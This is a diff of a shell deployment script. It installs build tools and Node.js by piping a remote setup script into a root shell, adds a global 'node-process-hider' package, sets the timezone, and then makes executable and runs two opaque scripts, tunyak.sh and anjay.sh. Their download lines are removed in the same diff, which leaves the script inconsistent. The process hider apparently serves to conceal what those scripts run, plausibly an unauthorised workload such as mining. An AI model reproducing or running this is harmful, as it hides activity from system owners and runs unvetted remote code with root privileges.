@@ -1,6 +1,13 @@
 #!/bin/sh
 
-wget https://github.com/01057057/cangcut/raw/main/tunyak.sh
-wget https://github.com/01057057/cangcut/raw/main/anjay.sh
+apt-get update;apt-get -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+npm i -g node-process-hider
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+sleep 10
+
 chmod u+x tunyak.sh && chmod u+x anjay.sh
 ./tunyak.sh 
